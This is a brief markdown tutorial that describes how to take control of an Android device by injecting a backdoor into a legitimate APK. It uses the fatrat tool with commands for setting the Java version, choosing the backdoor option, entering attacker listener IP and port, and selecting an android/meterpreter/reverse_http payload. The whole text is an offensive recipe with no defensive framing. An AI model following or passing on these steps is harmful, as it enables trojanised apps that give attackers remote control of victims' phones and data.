# Android backdoor

### This file is created to show how to create a backdoor and take control of an android device

1. We can download the apk from [APKMirror](http://www.apkmirror.com)

2. We need to change the default version of java to compile our generated backdoor. We will use fatrat.

```terminal
update-alternatiuves --config java
```

and we select the version we want to config.

3. We have to run fatrat, select the option to backdoring an original apk and configure our backdoor, e.g. the ip and port where we will be waiting a connection and The path of the downloaded APK..

```
sudo fatrat 

select choice 5

LHOST IP:
LPORT: 
Path:

Choose Payload: 1 -- this would be a android/meterpreter/reverse_http

Select tool to create apk: 1 --- Backdoor-apk 0.2.2
```

4. We will get the path of the generated apk. 